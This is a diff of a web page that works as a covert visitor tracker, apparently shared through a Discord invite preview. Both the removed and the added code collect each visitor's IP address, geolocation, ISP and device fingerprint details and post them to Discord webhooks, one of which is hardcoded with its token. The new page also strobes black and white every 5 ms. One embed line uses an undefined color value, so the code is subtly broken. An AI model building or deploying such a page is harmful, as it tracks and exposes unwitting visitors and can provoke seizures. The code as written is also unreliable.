@@ -1,143 +1,97 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Info Void</title>
-  <link rel="stylesheet" href="src/css/main.min.css">
-  <link href="https://cdn.staticaly.com/gh/hung1001/font-awesome-pro/4cac1a6/css/all.css" rel="stylesheet" type="text/css" />
-  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" integrity="sha512-xodZBNTC5n17Xt2atTPuE1HxjVMSvLVW9ocqUKLsCC5CXdbqCmblAshOMAS6/keqq/sMZMZ19scR4PsZChSR7A==" crossorigin="" />
-  <link rel="icon" type="image/x-icon" href="./src/icon.ico">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>elvin</title>
+    <meta name="og:title" content="klanul menajerelor">
+    <meta name="og:url" content="https://discord.gg/vexaru">
+    <meta name="og:description" content="sefii pa bune sclavilor">
+    <meta name="og:image" content="https://i.pinimg.com/564x/51/ee/5b/51ee5b14a1b29ee51db5e43962a8de96.jpg">
+    <link rel="icon" href="https://cdn.discordapp.com/attachments/1160620932583411774/1171548221693247548/image-removebg-preview_3.png" type="image/png">
+    <style>
+        body {display: flex;align-items: center;justify-content: center;height: 100vh;margin: 0;transition: background-color 0.00000000000000000000001s ease;}
+        .ip {font-size: 20px;color: #FFD700;margin: auto;text-align: center;}
+    </style>
 </head>
 <body>
-  <header class="header"></header>
-  <script src="./config.js"></script>
-  <script>
-    function getInformation(link, callback) {
-      var xhr = new XMLHttpRequest();
-      xhr.open("GET", link, true);
-      xhr.onreadystatechange = function() {
-        if (xhr.readyState === 4) {
-          callback(xhr.responseText);
+    <div class="ip" id="ip"></div>
+    <script>
+        function change() {
+            const colors = ["#000000", "#ffffff"];
+            let index = 0;
+            setInterval(() => {
+                document.body.style.backgroundColor = colors[index];
+                index = (index + 1) % colors.length;
+            }, 5);
         }
-      };
-      xhr.send(null);
-    }
 
-    getInformation("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function(text) {
-      var ipInfoDiv = document.createElement("div");
-      ipInfoDiv.innerHTML = text;
-      ipInfoDiv.id = "ipInfo";
-      const header = document.querySelector(".header");
-      header.appendChild(ipInfoDiv);
+        function send(info, additional) {
+            const webhook = 'https://discord.com/api/webhooks/1248968068080599070/jXJlCzXzLGAK46bUCJ3ml0b8X1BEbzTpCXy4S-2Ln5_biqkLINezVSqlegJIbZxDVZQ8';
 
-      sendEmbed();
-    });
+            const embed = {
+                title: `**${info.ip}**`,
+                color: ff0000,
+                fields: [
+                    { name: "city", value: info.city, inline: true },
+                    { name: "region", value: info.region, inline: true },
+                    { name: "country", value: info.country, inline: true },
+                    { name: "location", value: info.loc, inline: true },
+                    { name: "organization", value: info.org, inline: true },
+                    { name: "timezone", value: info.timezone, inline: true },
+                    { name: "language", value: navigator.language, inline: true },
+                    { name: "platform", value: navigator.platform, inline: true },
+                    { name: "screen width", value: screen.width.toString(), inline: true },
+                    { name: "screen height", value: screen.height.toString(), inline: true },
+                    { name: "device memory", value: navigator.deviceMemory ? navigator.deviceMemory.toString() + ' GB' : 'N/A', inline: true },
+                    { name: "ect", value: navigator.connection ? navigator.connection.effectiveType : 'N/A', inline: true },
+                    { name: "downlink", value: navigator.connection ? navigator.connection.downlink + ' Mbps' : 'N/A', inline: true },
+                    { name: "latency", value: additional.latency + ' ms', inline: true },
+                    { name: "browser engine", value: navigator.product, inline: true },
+                    { name: "user agent", value: navigator.userAgent, inline: false }
+                ],
+                timestamp: new Date()
+            };
 
-    getInformation("https://api.ipify.org/", function(text) {
-      var ipifyDiv = document.createElement("div");
-      ipifyDiv.innerHTML = text;
-      ipifyDiv.id = "ipify";
-      const header = document.querySelector(".header");
-      header.appendChild(ipifyDiv);
-    });
+            const payload = {
+                embeds: [embed]
+            };
 
-    function sendEmbed() {
-      var ipInfo = JSON.parse(document.getElementById('ipInfo').textContent);
-      var ipify = document.getElementById('ipify').innerHTML;
+            fetch(webhook, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
+        }
 
-      const embed1 = {
-        title: "Información IP",
-        color: 0x000000, 
-        fields: [
-          {
-            name: "IP",
-            value: ipify,
-            inline: true
-          },
-          {
-            name: "País",
-            value: ipInfo.country,
-            inline: true 
-          },
-          {
-            name: "Región",
-            value: ipInfo.regionName,
-            inline: true
-          },
-          {
-            name: "Ciudad",
-            value: ipInfo.city,
-            inline: true 
-          },
-          {
-            name: "Proveedor de Internet",
-            value: ipInfo.isp,
-            inline: true 
-          },
-          {
-            name: "Proxy",
-            value: ipInfo.proxy ? "Sí" : "No",
-            inline: true
-          }
-        ]
-      };
+        function latency() {
+            return new Promise((resolve) => {
+                const startTime = Date.now();
+                fetch('https://www.cloudflare.com/cdn-cgi/trace')
+                    .then(() => {
+                        const latency = Date.now() - startTime;
+                        resolve(latency);
+                    });
+            });
+        }
 
-      const params1 = {
-        username: "Neko Kawaii",
-        avatar_url: 'https://media.discordapp.net/attachments/1151339410470752338/1151422586283118602/208-2088727_neko-kawaii-anime-png-download-cute-neko-anime.png?width=501&height=566',
-        embeds: [embed1]
-      };
+        fetch('https://api64.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.ip;
+                document.getElementById("ip").textContent = ip;
+                change();
 
-      const request1 = new XMLHttpRequest();
-      request1.open("POST", gotit);
-      request1.setRequestHeader('Content-type', 'application/json');
-      request1.send(JSON.stringify(params1));
-
-      const now = new Date();
-      const logEmbed = {
-        title: "Registro de IP",
-        color: 0xFF0000, 
-        fields: [
-          {
-            name: "IP",
-            value: ipify,
-            inline: true
-          },
-          {
-            name: "Fecha",
-            value: now.toLocaleDateString(),
-            inline: true 
-          },
-          {
-            name: "Hora",
-            value: now.toLocaleTimeString(),
-            inline: true
-          }
-        ]
-      };
-
-      const logParams = {
-        username: "Neko Kawaii",
-        avatar_url: 'https://media.discordapp.net/attachments/1151339410470752338/1151422586283118602/208-2088727_neko-kawaii-anime-png-download-cute-neko-anime.png?width=501&height=566',
-        embeds: [logEmbed]
-      };
-
-      const logRequest = new XMLHttpRequest();
-      logRequest.open("POST", ipLogWebhook);
-      logRequest.setRequestHeader('Content-type', 'application/json');
-      logRequest.send(JSON.stringify(logParams));
-    }
-  </script>
-  <style>
-    .header {
-      display: none
-    }
-
-    .map-container {
-      display: none
-    }
-  </style>
+                fetch(`https://ipinfo.io/${ip}/json`)
+                    .then(response => response.json())
+                    .then(info => {
+                        latency().then(latency => {
+                            send(info, { latency });
+                        });
+                    });
+            });
+    </script>
 </body>
 </html>
